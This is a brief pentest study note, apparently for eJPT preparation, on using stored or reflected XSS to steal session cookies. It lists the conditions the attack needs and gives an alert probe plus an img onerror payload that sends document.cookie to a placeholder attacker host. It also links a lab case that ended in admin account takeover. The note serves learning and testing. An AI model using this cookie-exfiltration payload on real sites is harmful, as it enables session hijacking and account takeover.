---
type: technique
tags: [ejpt:web-pentest]
tools: [burp-suite]
cves: []
related: [[session-and-cookie-abuse]], [[web-cache-deception]]
---

# XSS and Cookie Theft

Stored/reflected cross-site scripting weaponized to steal session cookies.

## When it works

- Input is reflected/stored without sanitization.
- Session cookies lack `HttpOnly` (and often `Secure`) flags, so `document.cookie` is readable by injected JS.

## Payloads

```html
<script>alert()</script>
```

```text
<img src=x onerror="fetch('http://ATTACKER:5000/?c='+document.cookie)">
```

## Seen in

[[baluhome]] (stored XSS in subtitle → admin cookie theft → account takeover)
